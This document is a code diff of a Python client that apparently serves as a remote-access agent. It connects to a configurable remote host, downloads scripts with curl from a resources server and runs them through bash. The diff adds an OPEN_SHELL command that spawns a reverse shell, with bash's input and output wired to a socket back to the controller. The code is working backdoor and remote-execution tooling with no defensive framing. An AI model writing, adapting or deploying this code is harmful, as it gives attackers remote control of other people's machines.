@@ -6,17 +6,32 @@ from base64 import b64decode, b64encode
 import subprocess
 import random
 import string
+import os
+
+
+class EnvKeys:
+    REMOTE_IP = 'REMOTE_IP'
+    REMOTE_PORT = 'REMOTE_PORT'
+    RESOURCES_PORT = 'RESOURCES_PORT'
+    SHELL_CONVERSATION_UID = 'SHELL_CONVERSATION_UID'
+
+
+class Env:
+    remote_ip = os.environ.get(EnvKeys.REMOTE_IP, 'localhost')
+    remote_port = int(os.environ.get(EnvKeys.REMOTE_PORT, 1337))
+    resources_port = int(os.environ.get(EnvKeys.RESOURCES_PORT, 1338))
+    shell_conversation_uid = os.environ.get(EnvKeys.SHELL_CONVERSATION_UID, None)
 
 
 class Message:
     REPLY = 'REPLY'
     RUN_SCRIPT = 'RUN_SCRIPT'
+    OPEN_SHELL = 'OPEN_SHELL'
     conversation_uid: str
     purpose: str
     args: Tuple[str]
 
     def __init__(self, purpose: str, *args: str, conversation_uid=None):
-        assert len(args) >= 1
         self.purpose = purpose
         self.args = args
         self.conversation_uid = conversation_uid if conversation_uid is not None else ''.join(random.choice(string.ascii_letters) for _ in range(16))
@@ -68,43 +83,35 @@ class Core:
 
 
 class MessageProcessor:
-    remote_ip: str
-    resources_port: str
-
     @staticmethod
-    def process_messages_forever(remote_ip: str, resources_port: int):
-        MessageProcessor.remote_ip = remote_ip
-        MessageProcessor.resources_port = resources_port
+    def process_messages_forever():
         while True:
             message = Communication.messages_received.get()
             print(f'Processing: {message}')
             if message.purpose == Message.RUN_SCRIPT:
-                MessageProcessor._process_script(message)
+                script_name = message.args[0]
+                script_data = MessageProcessor._get_resource('scripts', script_name)
+                script = subprocess.Popen(['bash', '-s'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+                stdout, stderr = script.communicate(script_data)
+                Communication.messages_to_send.put(Message(
+                    Message.REPLY,
+                    stdout.decode(),
+                    stderr.decode(),
+                    conversation_uid=message.conversation_uid
+                ))
+            elif message.purpose == Message.OPEN_SHELL:
+                subprocess.Popen(['python3', __file__], env={**os.environ, **{EnvKeys.SHELL_CONVERSATION_UID: message.conversation_uid}}, stdin=subprocess.DEVNULL)  # , stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             else:
                 send_error_message('process_messages_forever', f'Unknown message purpose {message.purpose}')
 
     @staticmethod
     def _get_resource(category: str, name: str) -> bytes:
-        print(f'{MessageProcessor.remote_ip}:{MessageProcessor.resources_port}/{category}/{name}')
-        curl = subprocess.run(['curl', '-s', f'http://{MessageProcessor.remote_ip}:{MessageProcessor.resources_port}/{category}/{name}'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        print(f'{Env.remote_ip}:{Env.resources_port}/{category}/{name}')
+        curl = subprocess.run(['curl', '-s', f'http://{Env.remote_ip}:{Env.resources_port}/{category}/{name}'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         if curl.returncode != 0:
             send_error_message('process_messages_forever', f'Resources server down or missing {category}/{name}\n{curl.stderr.decode()}')
             raise Exception()
         return curl.stdout
-
-    @staticmethod
-    def _process_script(message: Message):
-        print(message)
-        script_name = message.args[0]
-        script_data = MessageProcessor._get_resource('scripts', script_name)
-        script = subprocess.Popen(['bash', '-s'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        stdout, stderr = script.communicate(script_data)
-        Communication.messages_to_send.put(Message(
-            Message.REPLY,
-            stdout.decode(),
-            stderr.decode(),
-            conversation_uid=message.conversation_uid
-        ))
 
 
 def get_cmd_output(cmd: str, strip_new_line=True) -> str:
@@ -123,11 +130,19 @@ class Config:
         Config.username = get_cmd_output('whoami')
 
 
-def initialise(remote_ip: str, remote_port: int, resources_port: int, local_ip: str):
-    Config.initialise()
-    sock = socket.create_connection((remote_ip, remote_port))
-    Communication.initialise_communication(sock)
-    MessageProcessor.process_messages_forever(remote_ip, resources_port)
+def main():
+    if Env.shell_conversation_uid is not None:
+        header = b':'.join(b64encode(header_part.encode()) for header_part in ['', Message.OPEN_SHELL, Env.shell_conversation_uid])
+        sock = socket.create_connection((Env.remote_ip, Env.remote_port))
+        sock.send(header + b'\n')
+        stdin = sock.makefile('rb', 0)
+        stdout = sock.makefile('wb', 0)
+        exit(subprocess.run(['bash'], stdin=stdin, stdout=stdout, stderr=subprocess.DEVNULL).returncode)
+    else:
+        Config.initialise()
+        sock = socket.create_connection((Env.remote_ip, Env.remote_port))
+        Communication.initialise_communication(sock)
+        MessageProcessor.process_messages_forever()
 
 
 def send_error_message(location: str, error: str):
@@ -139,9 +154,4 @@ def send_error_message(location: str, error: str):
 
 
 if __name__ == '__main__':
-    initialise(
-        'localhost',
-        1337,
-        1338,
-        'localhost'
-    )
+    main()
